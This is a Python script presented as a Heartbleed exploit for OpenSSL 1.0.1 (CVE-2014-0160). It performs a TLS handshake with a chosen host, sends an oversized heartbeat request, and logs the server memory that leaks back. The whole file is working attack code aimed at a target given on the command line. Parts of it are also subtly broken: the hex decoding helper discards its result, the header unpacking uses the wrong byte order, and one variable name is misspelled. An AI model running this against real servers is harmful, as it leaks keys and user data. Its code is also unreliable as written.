import socket 
import codecs 
import logging 
import struct 
import argparse 
 
 
def hex2bin(x): 
    x.replace(' ', '').replace('\n', '').decode('hex')
    return x 
 
parse = argparse.ArgumentParser(description='Heartbleed exploit /OpenSSL 1.0.1 vulnerability/CVE-2014-0160') 
 
parse.add_argument('host', help = 'Target IP',type=str) 
parse.add_argument('port',help='Port to connect to',type =int) 
parse.set_defaults(port=443) 
 
args = parse.parse_args() 
 
logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO) 
 
hello = hex2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                 
''')

heartbleed = hex2bin('''
18 03 02 00 03 
01 40 00
''')

print(heartbleed)


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def recvall(size):
    buf =b''
    while size:
        new = sock.recv(size)
        if not new:
            return None
        buf +=new
        size -= len(new)
    return buf

def exec_heartbleed():

    sock.send(heartbleed)

    hdr = sock.recv(5)

    if hdr is None:
        print('Server closed connection...')
        return False

    content_type, version,length = struct.unpack('=BHH', hdr)

    if content_type is None:
        print('No heartbeat response, server not vulnerable')
        return False

    payload =recvall(length)

    if payload is None:
        print('No heartbeat payload, closed connection')
        return False

    if content_type ==24 and len(payload)>3:
        print('Heartbeat response, server vulnerable...' , '\n')
        logging.info(payload)
        return True

    else:
        print('Different type or payload length than desired...')
        logging.info(paylaod)

    if content_type==24 and len(payload)<3:
        print('Heartbeat response, but payload too short...')
        return True

    if content_type ==21:
        print('Error from server')


def main():

    sock.connect((args.host , args.port))
    logging.info('Attacking %s on port %d' , args.host,args.port)
    print(struct.calcsize('=BHH'))
    sock.send(hello)

    while True:

        (content_type, version, length) = struct.unpack('=BHH', sock.recv(5))
        print(version)
        handsh = recvall(length)
        logging.info("Got message - type:%d and length %d" ,content_type,length)
        if content_type==22 and ord(handsh[0])==0x0E:
            break

    logging.info('Handshake done...Executing heartbleed')

    exec_heartbleed()

if __name__=='__main__':
    main()                                                                                                    

